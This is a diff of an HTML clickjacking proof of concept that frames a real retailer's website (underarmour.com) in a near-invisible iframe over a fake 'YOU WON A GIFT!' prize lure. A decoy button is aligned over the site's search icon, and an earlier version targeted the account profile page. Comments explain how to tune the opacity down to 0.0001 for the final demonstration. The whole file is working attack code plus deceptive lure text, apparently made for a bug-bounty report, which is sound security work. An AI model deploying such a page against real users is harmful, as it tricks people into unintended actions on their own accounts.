@@ -1,46 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>High Impact Clickjack PoC</title>
+    <title>Impactful Clickjacking PoC</title>
     <style>
-        body { margin: 0; padding: 0; }
-        #decoy {
+        body, html { margin: 0; padding: 0; overflow: hidden; }
+        
+        #decoy-layer {
             position: absolute;
             width: 100%;
             height: 100%;
+            background: white;
             z-index: 1;
             text-align: center;
-            font-family: Arial, sans-serif;
+            padding-top: 100px;
         }
-        #fake-btn {
-            position: absolute;
-            /* In values ko sensitive button ke upar set karein */
-            top: 310px; 
-            left: 50%;
-            transform: translateX(-50%);
-            padding: 15px 40px;
-            background: #e74c3c;
-            color: white;
+
+        #fake-search-btn {
+            padding: 15px 30px;
+            background: #000;
+            color: #fff;
             border: none;
+            font-size: 18px;
             cursor: pointer;
-            border-radius: 5px;
+            position: absolute;
+            /* In values ko search icon ke upar align karein */
+            top: 20px; 
+            right: 60px; 
         }
+
         iframe {
             position: absolute;
+            top: 0;
+            left: 0;
             width: 100%;
             height: 100%;
             z-index: 2;
-            opacity: 0.3; /* Test ke baad 0.0001 kar dein */
+            opacity: 0.5; /* Alignment ke liye 0.5 rakhein, final video ke liye 0.0001 */
             border: none;
         }
     </style>
 </head>
 <body>
-    <div id="decoy">
-        <h1>CONGRATULATIONS!</h1>
-        <p>You won a $500 Gift Card. Click below to claim.</p>
-        <button id="fake-btn">CLAIM NOW</button>
+
+    <div id="decoy-layer">
+        <h1>YOU WON A GIFT!</h1>
+        <p>Click the black button in the corner to select your prize.</p>
+        <button id="fake-search-btn">SELECT PRIZE</button>
     </div>
-    <iframe src="https://www.underarmour.com/en-us/account/profile"></iframe>
+
+    <iframe src="https://www.underarmour.com/en-us/"></iframe>
+
 </body>
 </html>
